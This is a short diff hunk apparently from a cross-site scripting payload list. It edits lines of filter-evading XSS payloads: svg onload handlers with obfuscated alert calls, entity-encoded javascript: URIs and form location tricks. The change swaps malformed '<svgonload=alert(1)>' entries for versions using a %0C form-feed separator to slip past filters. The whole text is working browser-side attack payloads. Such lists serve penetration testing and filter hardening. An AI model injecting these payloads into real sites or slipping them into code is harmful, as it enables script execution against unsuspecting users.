@@ -79,9 +79,9 @@ jAvAsCrIpT&colon;prompt&lpar;1&rpar;
 <svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
 "><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
 '><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//
-<svgonload=alert(1)>
-"><svgonload=alert(1)>
-'><svgonload=alert(1)>
+<svg%0Conload=alert(1)>
+"><svg%0Conload=alert(1)>
+'><svg%0Conload=alert(1)>
 <form name=self location="javascript:alert(1)"
 "><form name=self location="javascript:alert(1)"
 '><form name=self location="javascript:alert(1)">
